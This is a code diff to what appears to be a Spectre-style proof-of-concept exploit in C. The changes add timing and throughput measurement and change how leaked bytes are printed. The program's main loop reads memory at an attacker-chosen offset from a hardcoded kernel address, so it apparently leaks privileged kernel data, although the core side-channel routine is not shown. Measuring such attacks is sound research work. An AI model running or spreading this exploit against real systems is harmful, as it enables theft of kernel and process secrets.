@@ -12,6 +12,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <time.h>
 
 #define MY_MMAP_LEN (256)
 #define PAGE_SIZE 4096
@@ -144,17 +145,22 @@ int main(int argc, const char **argv) {
     malicious_y = 0xffff92f4829317e0 - kernel_array2;
     sscanf(argv[2], "%d", &len);
 
+    clock_t start, finish;
+    double duration = (double)len;
+    start = clock();
 
     printf("Reading %d bytes:\n", len);
     while (--len >= 0) {
-        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+        // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         readMemoryByte(malicious_x++, malicious_y, value, score);
-        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-        printf("0x%02X=’%c’ score=%d ", value[0],
-                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-        if (score[1] > 0)
-            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-	printf("\n");
+        // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+        printf("%c", (value[0] > 31 && value[0] < 127 ? value[0] : '?'));
+        // if (score[1] > 0)
+        //     printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+	// printf("\n");
     }
+    finish = clock();
+    printf("time: %fms rate: %f kbps\n", ((double)(finish - start) / CLOCKS_PER_SEC)*1000 ,duration*8/((double)(finish - start) / CLOCKS_PER_SEC * 1000));
+
     return(0);
 }
